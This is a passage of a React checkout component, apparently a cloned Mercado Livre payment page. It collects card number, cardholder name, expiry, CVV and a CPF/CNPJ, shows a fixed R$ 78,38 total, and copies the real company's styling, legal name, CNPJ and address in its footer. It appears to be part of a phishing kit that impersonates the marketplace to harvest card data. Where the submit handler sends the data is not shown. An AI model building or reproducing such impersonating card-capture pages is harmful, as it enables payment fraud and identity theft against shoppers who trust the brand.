                                                                            else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d+)/, "$1.$2.$3");
                                                                            else if (v.length > 3) v = v.replace(/(\d{3})(\d+)/, "$1.$2");
                                                                        } else {
                                                                            if (v.length > 14) v = v.substring(0, 14);
                                                                            if (v.length > 12) v = v.replace(/(\d{2})(\d{3})(\d{3})(\d{4})(\d+)/, "$1.$2.$3/$4-$5");
                                                                            else if (v.length > 8) v = v.replace(/(\d{2})(\d{3})(\d{3})(\d+)/, "$1.$2.$3/$4");
                                                                            else if (v.length > 5) v = v.replace(/(\d{2})(\d{3})(\d+)/, "$1.$2.$3");
                                                                            else if (v.length > 2) v = v.replace(/(\d{2})(\d+)/, "$1.$2");
                                                                        }
                                                                        setCardCpf(v);
                                                                    }} />
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div><span className="andes-visually-hidden"
                                                    data-testid="card-form--fields-aria-alert" aria-live="assertive"
                                                    role="alert"></span>
                                            </form>
                                            <div className="card-form--card-preview" data-testid="card-form--card-preview"
                                                aria-hidden="true">
                                                <div className="card-draw-size-regular">
                                                    <div className="card-draw-inner" data-testid="card-inner">
                                                        <div className="card-draw-front" data-testid="card-front"
                                                            style={{ backgroundColor: "rgb(90, 117, 137)" }}>
                                                            <div className="card-draw-elements-card"
                                                                data-testid="card-draw-elements-card-front">
                                                                <div className="card-draw-elements-front">
                                                                    <div className="card-draw-wrap-bin">
                                                                        <div className="card-draw-pan-bin"
                                                                            style={{ backgroundColor: "rgba(0, 0, 0, 0.55)" }}><span
                                                                                style={{ color: "rgb(255, 255, 255)" }}>{formatCardPreview()}</span></div>
                                                                    </div>
                                                                    <div className="">
                                                                        {cardNumber.replace(/\D/g, "").length > 0 && (
                                                                            <div className="">
                                                                                <img
                                                                                    alt=""
                                                                                    src={getCardImage()}
                                                                                    data-testid="card-draw-payment-method-img"
                                                                                    className="card-issuer-img-payment-method"
                                                                                    style={{ width: '40px', height: 'auto' }}
                                                                                />
                                                                            </div>
                                                                        )}
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div className="card-draw-back" data-testid="card-back"
                                                            style={{ backgroundColor: "rgb(90, 117, 137)" }}>
                                                            <div className="card-draw-elements-card">
                                                                <div className="card-draw-bar-code"></div><svg width="290"
                                                                    height="80" viewBox="0 0 290 80" fill="none"
                                                                    xmlns="http://www.w3.org/2000/svg"
                                                                    data-testid="back-cvv-icon">
                                                                    <rect x="0.492188" y="25" width="278.689" height="3"
                                                                        fill="#D8D8D8"></rect>
                                                                    <rect x="0.492188" y="31" width="278.689" height="3"
                                                                        fill="#D8D8D8"></rect>
                                                                    <rect x="0.492188" y="37" width="278.689" height="3"
                                                                        fill="#D8D8D8"></rect>
                                                                    <rect x="0.492188" y="43" width="278.689" height="3"
                                                                        fill="#D8D8D8"></rect>
                                                                    <rect x="0.492188" y="49" width="278.689" height="3"
                                                                        fill="#D8D8D8"></rect>
                                                                    <rect x="0.492188" y="28" width="278.689" height="3"
                                                                        fill="white"></rect>
                                                                    <rect x="0.492188" y="34" width="278.689" height="3"
                                                                        fill="white"></rect>
                                                                    <rect x="0.492188" y="40" width="278.689" height="3"
                                                                        fill="white"></rect>
                                                                    <rect x="0.492188" y="46" width="278.689" height="3"
                                                                        fill="white"></rect>
                                                                    <rect x="0.492188" y="52" width="278.689" height="3"
                                                                        fill="white"></rect>
                                                                    <rect x="219.754" y="25" width="59.4262" height="30"
                                                                        fill="white"></rect>
                                                                    <circle cx="250.008" cy="40" r="39" fill="white"
                                                                        fillOpacity="0.8" stroke="#F23D4F" strokeWidth="2">
                                                                    </circle>
                                                                    <path
                                                                        d="M259.066 44.3882C257.302 44.3882 255.874 42.9602 255.874 41.2242C255.874 39.4602 257.302 38.0322 259.066 38.0322C260.83 38.0322 262.258 39.4602 262.258 41.2242C262.258 42.9602 260.83 44.3882 259.066 44.3882Z"
                                                                        fill="black" fillOpacity="0.25"></path>
                                                                    <path
                                                                        d="M249.03 44.3882C247.266 44.3882 245.838 42.9602 245.838 41.2242C245.838 39.4602 247.266 38.0322 249.03 38.0322C250.794 38.0322 252.222 39.4602 252.222 41.2242C252.222 42.9602 250.794 44.3882 249.03 44.3882Z"
                                                                        fill="black" fillOpacity="0.9"></path>
                                                                    <path
                                                                        d="M238.995 44.3882C237.231 44.3882 235.803 42.9602 235.803 41.2242C235.803 39.4602 237.231 38.0322 238.995 38.0322C240.759 38.0322 242.187 39.4602 242.187 41.2242C242.187 42.9602 240.759 44.3882 238.995 44.3882Z"
                                                                        fill="black" fillOpacity="0.9"></path>
                                                                </svg>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </section>
                                </div>
                                <div id="bf_footer_continue_button/2b436617-de96-4608-8404-e54effcfe633"
                                    className="bf-ui-core-container hide-on-mobile bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap"
                                    aria-hidden="false" data-js="container"
                                    data-id="bf_footer_continue_button/2b436617-de96-4608-8404-e54effcfe633"
                                    data-testid="bf_footer_continue_button">
                                    <div className="card-form__button--submit-card"><button onClick={handleContinue} type="button"
                                        className="andes-button card-form__button--submit andes-button--large andes-button--loud"
                                        id="card-form__button--submit_id"><span
                                            className="andes-button__content">Continuar</span></button><span
                                                className="andes-visually-hidden" aria-live="assertive"></span></div>
                                </div>
                            </div>
                        </div>
                        <div id="overview_container/2b436617-de96-4608-8404-e54effcfe633"
                            className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--overview"
                            aria-hidden="false" data-js="container"
                            data-id="overview_container/2b436617-de96-4608-8404-e54effcfe633" data-testid="overview_container">
                            <span className="bf-ui-core-label bf-ui-core-label--margin--top-spacing56" role="presentation"
                                data-testid="purchase_summary/2b436617-de96-4608-8404-e54effcfe633"
                                id="purchase_summary/2b436617-de96-4608-8404-e54effcfe633" aria-hidden="false"><span
                                    className="andes-visually-hidden">Resumo da compra</span>
                                <div className="bf-ui-core-rich-text__title bf-ui-core-rich-text__title--titlexs"
                                    aria-hidden="false" data-testid="purchase_summary-0" id="purchase_summary-0">
                                    <h2
                                        className="andes-typography andes-typography--type-title andes-typography--size-xs andes-typography--color-primary andes-typography--weight-semibold">
                                        Resumo da compra</h2>
                                </div>
                            </span>
                            <hr className="bf-ui-core-separator bf-ui-core-separator--margin--top-spacing16 bf-ui-core-separator--margin--bottom-spacing16 bf-ui-core-separator--background-gray070 bf-ui-core-separator--height-spacing1"
                                aria-hidden="true" id="separator_title_overview/2b436617-de96-4608-8404-e54effcfe633"
                                data-testid="separator_title_overview" />
                            <div id="product_container/2b436617-de96-4608-8404-e54effcfe633"
                                className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--between bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap"
                                aria-hidden="false" data-js="container"
                                data-id="product_container/2b436617-de96-4608-8404-e54effcfe633"
                                data-testid="product_container"><span className="bf-ui-core-label" role="presentation"
                                    data-testid="description_product/2b436617-de96-4608-8404-e54effcfe633"
                                    id="description_product/2b436617-de96-4608-8404-e54effcfe633" aria-hidden="false"><span
                                        className="andes-visually-hidden">Produto</span><span
                                            className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodym"
                                            aria-hidden="true" data-testid="description_product-0" id="description_product-0"
                                            role="presentation"><span
                                                className="andes-typography andes-typography--type-body andes-typography--size-m andes-typography--color-primary andes-typography--weight-regular"
                                                role="presentation">Produto</span></span></span><span className="bf-ui-core-label"
                                                    role="presentation"
                                                    data-testid="price_description_product/2b436617-de96-4608-8404-e54effcfe633"
                                                    id="price_description_product/2b436617-de96-4608-8404-e54effcfe633"
                                                    aria-hidden="false"><span
                                                        className="bf-ui-core-rich-text__price bf-ui-core-rich-text__price--primary"
                                                        data-testid="price_description_product-0" id="price_description_product-0"
                                                        aria-hidden="false" role="presentation"><span
                                                            className="andes-money-amount andes-money-amount--cents-superscript"
                                                            style={{ fontSize: "16px" }} role="img" id=":R39one:"
                                                            aria-label={`R$ ${totalParts.integer},${totalParts.cents}`} aria-roledescription="Valor"><span
                                                                className="andes-money-amount__currency-symbol" aria-hidden="true">R$</span><span
                                                                    className="andes-money-amount__fraction" aria-hidden="true">{totalParts.integer}</span><span
                                                                        className="andes-visually-hidden" aria-hidden="true">,</span><span
                                                                            className="andes-money-amount__cents andes-money-amount__cents--superscript-16"
                                                                            style={{ fontSize: "10px", marginTop: "2px" }}
                                                                            aria-hidden="true">{totalParts.cents}</span></span></span></span></div>
                            <div id="shipping_container/2b436617-de96-4608-8404-e54effcfe633"
                                className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--between bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--margin--top-spacing8"
                                aria-hidden="false" data-js="container"
                                data-id="shipping_container/2b436617-de96-4608-8404-e54effcfe633"
                                data-testid="shipping_container"><span className="bf-ui-core-label" role="presentation"
                                    data-testid="description_shipping/2b436617-de96-4608-8404-e54effcfe633"
                                    id="description_shipping/2b436617-de96-4608-8404-e54effcfe633" aria-hidden="false"><span
                                        className="andes-visually-hidden">Envio</span><span
                                            className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodym"
                                            aria-hidden="true" data-testid="description_shipping-0" id="description_shipping-0"
                                            role="presentation"><span
                                                className="andes-typography andes-typography--type-body andes-typography--size-m andes-typography--color-primary andes-typography--weight-regular"
                                                role="presentation">Envio</span></span></span><span className="bf-ui-core-label"
                                                    role="presentation"
                                                    id="price_shipping/2b436617-de96-4608-8404-e54effcfe633"
                                                    aria-hidden="false">
                                                    <span className="andes-visually-hidden">Envio</span>
                                                    <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--positive bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodym" aria-hidden="true" role="presentation">
                                                        {selectedShipping && !selectedShipping.isFree ? (
                                                            <span className="andes-money-amount andes-money-amount--cents-superscript" style={{ fontSize: "16px" }}>
                                                                <span className="andes-money-amount__currency-symbol">{shippingParts.symbol}</span>
                                                                <span className="andes-money-amount__fraction">{shippingParts.integer}</span>
                                                                <span className="andes-visually-hidden">,</span>
                                                                <span className="andes-money-amount__cents andes-money-amount__cents--superscript-16" style={{ fontSize: "10px", marginTop: "2px" }}>{shippingParts.cents}</span>
                                                            </span>
                                                        ) : (isFreeShipping || selectedShipping?.isFree) ? (
                                                            <span className="andes-typography andes-typography--type-body andes-typography--size-m andes-typography--color-positive andes-typography--weight-regular" role="presentation">Grátis</span>
                                                        ) : (
                                                            <span className="andes-typography andes-typography--type-body andes-typography--size-m andes-typography--color-primary andes-typography--weight-regular" role="presentation">—</span>
                                                        )}
                                                    </span>
                                                </span></div>
                            <hr className="bf-ui-core-separator bf-ui-core-separator--margin--top-spacing16 bf-ui-core-separator--margin--bottom-spacing16 bf-ui-core-separator--background-gray070 bf-ui-core-separator--height-spacing1"
                                aria-hidden="true" id="separator_4/2b436617-de96-4608-8404-e54effcfe633"
                                data-testid="separator_4" />
                            <div id="purchase_amount_container/2b436617-de96-4608-8404-e54effcfe633"
                                className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--between bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap"
                                aria-hidden="false" data-js="container"
                                data-id="purchase_amount_container/2b436617-de96-4608-8404-e54effcfe633"
                                data-testid="purchase_amount_container"><span className="bf-ui-core-label" role="presentation"
                                    data-testid="purchase_amount_label_purchase_amount_container/2b436617-de96-4608-8404-e54effcfe633"
                                    id="purchase_amount_label_purchase_amount_container/2b436617-de96-4608-8404-e54effcfe633"
                                    aria-hidden="false"><span className="andes-visually-hidden">Pagará com</span><span
                                        className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodym"
                                        aria-hidden="true" data-testid="purchase_amount_label_purchase_amount_container-0"
                                        id="purchase_amount_label_purchase_amount_container-0" role="presentation"><span
                                            className="andes-typography andes-typography--type-body andes-typography--size-m andes-typography--color-primary andes-typography--weight-regular"
                                            role="presentation">Pagará com</span></span></span><span className="bf-ui-core-label"
                                                role="presentation"
                                                data-testid="purchase_amount_price_purchase_amount_container/2b436617-de96-4608-8404-e54effcfe633"
                                                id="purchase_amount_price_purchase_amount_container/2b436617-de96-4608-8404-e54effcfe633"
                                                aria-hidden="false"><span
                                                    className="bf-ui-core-rich-text__price bf-ui-core-rich-text__price--primary"
                                                    data-testid="purchase_amount_price_purchase_amount_container-0"
                                                    id="purchase_amount_price_purchase_amount_container-0" aria-hidden="false"
                                                    role="presentation"><span
                                                        className="andes-money-amount andes-money-amount--cents-superscript andes-money-amount--weight-semibold"
                                                        style={{ fontSize: "18px" }} role="img" id=":R3b8ne:"
                                                        aria-label="78 reais com 38 centavos" aria-roledescription="Valor"><span
                                                            className="andes-money-amount__currency-symbol" aria-hidden="true">R$</span><span
                                                                className="andes-money-amount__fraction" aria-hidden="true">78</span><span
                                                                    className="andes-visually-hidden" aria-hidden="true">,</span><span
                                                                        className="andes-money-amount__cents andes-money-amount__cents--superscript-18"
                                                                        style={{ fontSize: "10px", marginTop: "3px" }}
                                                                        aria-hidden="true">38</span></span></span></span></div>
                        </div>
                        <div className="bf-core-loading bf-core-loading--fullscreen bf-core-loading--hidden" aria-live="polite">
                            <div className="bf-core-loading__circle"><svg className="bf-core-loading__svg" aria-hidden="true"
                                viewBox="0 0 50 50" focusable="false">
                                <circle className="bf-core-loading__circle-path" cx="50%" cy="50%" r="20" fill="none"></circle>
                            </svg></div>
                        </div>
                    </div>
                </div>
                {/* Fixed Mobile Buttons Footer (Moved outside flow so it's not trapped by transform perspective) */}
                <div className="card-form__buttons-mobile" id="mobile_buttons_container">
                    <button
                        disabled={mobileStep === 0}
                        onClick={() => { setMobileStep(s => Math.max(0, s - 1)); setErrorField(''); }}
                        type="button"
                        className={`andes-button card-form__button--previous andes-button--large andes-button--transparent ${mobileStep === 0 ? 'andes-button--disabled' : ''}`}
                    >
                        <span className="andes-button__content">Anterior</span>
                    </button>

                    {mobileStep < 3 ? (
                        <div className="card-form___buttons-mobile--hidden-false">
                            <button
                                onClick={() => {
                                    if (mobileStep === 0 && cardNumber.replace(/\D/g, '').length < 13) {
                                        setErrorField('cardNumber');
                                        return;
                                    }
                                    if (mobileStep === 1 && cardName.trim().length < 3) {
                                        setErrorField('cardName');
                                        return;
                                    }
                                    if (mobileStep === 2 && (!isValidDate(cardExpiry) || cardCvv.length < cvvLength)) {
                                        setErrorField('cardExpiryCvv');
                                        return;
                                    }
                                    setErrorField('');
                                    setMobileStep(s => Math.min(3, s + 1));
                                }}
                                type="button"
                                className="andes-button card-form__button--next andes-button--large andes-button--transparent"
                            >
                                <span className="andes-button__content">Próximo</span>
                            </button>
                        </div>
                    ) : (
                        <div className="card-form___buttons-mobile--hidden-true">
                            <button
                                onClick={handleContinue}
                                type="button"
                                className="andes-button card-form__button--submit andes-button--large andes-button--loud"
                                style={{ backgroundColor: '#3483fa', color: '#fff' }}
                            >
                                <span className="andes-button__content">Próximo</span>
                            </button>
                        </div>
                    )}
                </div>
            </main>
            <footer role="contentinfo" className="nav-footer">
                <div className="nav-footer-user-info nav-bounds">
                    <div className="nav-footer-info-wrapper">
                        <div className="nav-footer-primaryinfo"><small className="nav-footer-copyright">Copyright ©&nbsp;1999-2026
                            Ebazar.com.br LTDA.</small>
                            <nav className="nav-footer-navigation">
                                <ul className="nav-footer-navigation__menu">
                                    <li className="nav-footer-navigation__item"><a

                                        className="nav-footer-navigation__link">Trabalhe conosco</a></li>
                                    <li className="nav-footer-navigation__item"><a
                                        className="nav-footer-navigation__link">Termos e condições</a></li>
                                    <li className="nav-footer-navigation__item"><a

                                        className="nav-footer-navigation__link">Promoções</a></li>
                                    <li className="nav-footer-navigation__item"><a

                                        className="nav-footer-navigation__link">Privacidade</a></li>
                                    <li className="nav-footer-navigation__item"><a

                                        className="nav-footer-navigation__link">Acessibilidade</a></li>
                                    <li className="nav-footer-navigation__item"><a
                                        className="nav-footer-navigation__link">Contato</a></li>
                                    <li className="nav-footer-navigation__item"><a

                                        className="nav-footer-navigation__link">Seguros</a></li>
                                    <li className="nav-footer-navigation__item"><a

                                        className="nav-footer-navigation__link">Afiliados</a></li>
                                </ul>
                            </nav>
                        </div>
                        <p className="nav-footer-secondaryinfo">CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003,
                            Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.</p>
                    </div>
                </div><a className="nav-footer-hp" >Mercado
                    Livre</a>
            </footer>
        </>
    );
};

export default StoreCheckoutPaymentCard;
